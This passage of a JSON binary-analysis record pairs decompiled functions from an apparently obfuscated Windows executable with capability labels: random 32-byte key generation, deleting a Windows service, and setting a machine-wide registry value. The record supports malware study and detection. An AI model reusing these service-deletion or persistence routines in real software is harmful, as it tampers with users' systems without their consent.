        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403615) overlaps instruction at (ram,0x00403612)\n// \n\nint32_t __fastcall fcn.00403540(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    uint in_stack_00000014;\n    int32_t in_stack_00000018;\n    uint *puVar9;\n    \n    if ((0x23 < &stack0xfffffffc && *0x10 != 0x28) && (0x23 >= &stack0xfffffffc || *0x10 == 0x28)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    bVar7 = (POPCOUNT(in_EAX ^ 0xca) & 1U) == 0;\n    if ((bVar7) || (puVar9 = unaff_EDI,  !bVar7)) {\n        puVar9 = 0x7;\n        in_EAX = in_stack_00000018;\n        param_1 = in_stack_00000014;\n    }\n    iVar4 = *0x8b17b43a;\n    uVar1 = param_2 + 1U;\n    *(in_EAX + 7) = (*(in_EAX + 7) - (param_1 >> 8)) - (uVar1 < 0x8b);\n    iVar2 = fcn.004029f0(param_1, param_2 + 1U & 0xffffff00 | uVar1 + 0x75, 0x407054, puVar9);\n    *(iVar4 + -4) = iVar2;\n    if (iVar2 != 0) {\n        *(iVar4 + -0x24) = 0;\n        puVar9 = iVar4 + -0x23;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *puVar9 = 0;\n        *(puVar9 + 2) = 0;\n        puVar9 = _sym.imp.MSVCRT.dll_rand;\n        bVar7 = false;\n        puVar5 = NULL;\n        bVar8 = true;\n        do {\n            if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n                puVar5 = unaff_EDI;\n            }\n            uVar3 = (*puVar9)();\n            uVar3 = uVar3 & 0x800000ff;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n            }\n            *(iVar4 + -0x24 + puVar5) = uVar3;\n            puVar5 = puVar5 + 1;\n            bVar7 = puVar5 < 0x20;\n            bVar8 = puVar5 == 0x20;\n        } while (bVar7);\n        if ((puVar5 < 0x21) || (0x20 < puVar5)) {\n            puVar6 = *(iVar4 + -4);\ncode_r0x00403619:\n            puVar9 = iVar4 + -0x24;\n            for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar6 = *puVar9;\n                puVar9 = puVar9 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            fcn.00401370(*(iVar4 + 8), *(iVar4 + 0xc), *(iVar4 + 0x10), *(iVar4 + 0x14), iVar4 + -0x24, 0x20, \n                         *(iVar4 + -4));\n            fcn.00402a90(*(iVar4 + 0x18), *(iVar4 + 0x1c));\n            return 1;\n        }\n        puVar6 = puVar9 + 1;\n        *puVar9 = *puVar5;\n        iVar4 = -0x741e7e30;\n        iVar2 = extraout_ECX;\n        do {\n            if (SBORROW4(uVar3, uVar3) != false) goto code_r0x00403619;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 == 0);\n        iVar2 = in(0x5d);\n    }\n    return iVar2;\n}\n",
        "token_count": 1079
    },
    "004027e0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040281c) overlaps instruction at (ram,0x00402819)\n// \n\ncode * __cdecl fcn.004027e0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    bool bVar3;\n    int32_t iVar4;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    bVar3 = iVar1 == 0;\n    if (bVar3) {\n        return NULL;\n    }\n    if ((bVar3) || (!bVar3)) {\n        iVar4 = iVar1;\n        pcVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    }\n    else {\n        iVar4 = 0x47;\n        pcVar2 = sym.imp.ADVAPI32.dll_DeleteService;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1, iVar4);\n    return pcVar2;\n}\n",
        "token_count": 235
    },
    "00403010": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403010(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}